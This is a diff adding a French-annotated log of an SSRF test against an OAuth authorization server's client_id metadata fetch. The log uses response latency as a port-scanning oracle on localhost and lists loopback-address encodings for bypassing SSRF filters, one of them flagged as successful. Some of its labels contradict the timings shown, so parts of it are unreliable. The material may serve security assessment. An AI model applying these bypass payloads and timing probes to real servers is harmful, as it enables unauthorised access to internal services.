@@ -1,0 +1,79 @@
+=== A) ORACLE DE PORT (latence AS via CIMD client_id) ===
+    (5-6s = port ouvert qui ne repond pas en HTTP ; 0.6s = refuse/filtre)
+  127.0.0.1:3000                                  932ms  invalid_client
+  127.0.0.1:8080                                  642ms  invalid_client
+  127.0.0.1:8099                                  912ms  invalid_client
+  127.0.0.1:9000                                  611ms  invalid_client
+  127.0.0.1:5432                                  586ms  invalid_client
+  127.0.0.1:6379                                  593ms  invalid_client
+  127.0.0.1:27017                                 653ms  invalid_client
+  127.0.0.1:9200                                18070ms  invalid_client
+  127.0.0.1:11211                                3062ms  invalid_client
+  127.0.0.1:2379                                  439ms  invalid_client
+  127.0.0.1:8500                                  441ms  invalid_client
+  127.0.0.1:22                                   1456ms  invalid_client
+  127.0.0.1:80                                    500ms  invalid_client
+  127.0.0.1:443                                   515ms  invalid_client
+  127.0.0.1:4000                                  524ms  invalid_client
+  127.0.0.1:5000                                  537ms  invalid_client
+
+  === TABLE ===
+   port 3000     932ms  invalid_client
+   port 8080     642ms  invalid_client
+   port 8099     912ms  invalid_client
+   port 9000     611ms  invalid_client
+   port 5432     586ms  invalid_client
+   port 6379     593ms  invalid_client
+   port 27017    653ms  invalid_client
+   port 9200   18070ms  invalid_client   <<<< OUVERT (silencieux)
+   port 11211   3062ms  invalid_client   <<<< OUVERT (silencieux)
+   port 2379     439ms  invalid_client
+   port 8500     441ms  invalid_client
+   port 22      1456ms  invalid_client
+   port 80       500ms  invalid_client
+   port 443      515ms  invalid_client
+   port 4000     524ms  invalid_client
+   port 5000     537ms  invalid_client
+
+  ports ouverts (signature >3s) : 9200, 11211
+  ports fermes (signature <1.5s) : 3000, 8080, 8099, 9000, 5432, 6379, 27017, 2379, 8500, 22, 80, 443, 4000, 5000
+
+=== B) contournements de filtre SSRF (fiche arsenal : NAT64 / parser differential) ===
+  direct 127.0.0.1:3000 (ref)                     848ms  invalid_client
+  IPv6 loopback [::1]:3000                        738ms  invalid_client
+  IPv4-mapped [::ffff:127.0.0.1]:3000             917ms  invalid_client
+  IPv4-mapped long 0:0:0:0:0:ffff:7f00:1          565ms  invalid_client
+  NAT64 local-use 64:ff9b:1::7f00:1               534ms  invalid_client
+  NAT64 well-known 64:ff9b::7f00:1                566ms  invalid_client
+  decimal 2130706433                              580ms  invalid_client
+  hex 0x7f000001                                  520ms  invalid_client
+  octal 017700000001                             1219ms  invalid_client
+  court 127.1                                   25645ms  invalid_client
+  point final 127.0.0.1.                          503ms  invalid_client
+  userinfo x@127.0.0.1                           1829ms  invalid_client
+  backslash-@ (webhook\@127.0.0.1)                742ms  invalid_client
+  backslash-@ inverse (127.0.0.1\@webhook)        528ms  invalid_client
+  fragment #@webhook                             1656ms  invalid_client
+  null %00                                        524ms  invalid_client
+  CRLF injecte %0d%0a                             534ms  invalid_client
+  tab %09                                         607ms  invalid_client
+
+  === contournements qui heritent de la signature 5-6s (=> fetch interne reussi) ===
+   direct 127.0.0.1:3000 (ref)                      848ms
+   IPv6 loopback [::1]:3000                         738ms
+   IPv4-mapped [::ffff:127.0.0.1]:3000              917ms
+   IPv4-mapped long 0:0:0:0:0:ffff:7f00:1           565ms
+   NAT64 local-use 64:ff9b:1::7f00:1                534ms
+   NAT64 well-known 64:ff9b::7f00:1                 566ms
+   decimal 2130706433                               580ms
+   hex 0x7f000001                                   520ms
+   octal 017700000001                              1219ms
+   court 127.1                                    25645ms   <<<<<< BYPASS REUSSI
+   point final 127.0.0.1.                           503ms
+   userinfo x@127.0.0.1                            1829ms
+   backslash-@ (webhook\@127.0.0.1)                 742ms
+   backslash-@ inverse (127.0.0.1\@webhook)         528ms
+   fragment #@webhook                              1656ms
+   null %00                                         524ms
+   CRLF injecte %0d%0a                              534ms
+   tab %09                                          607ms
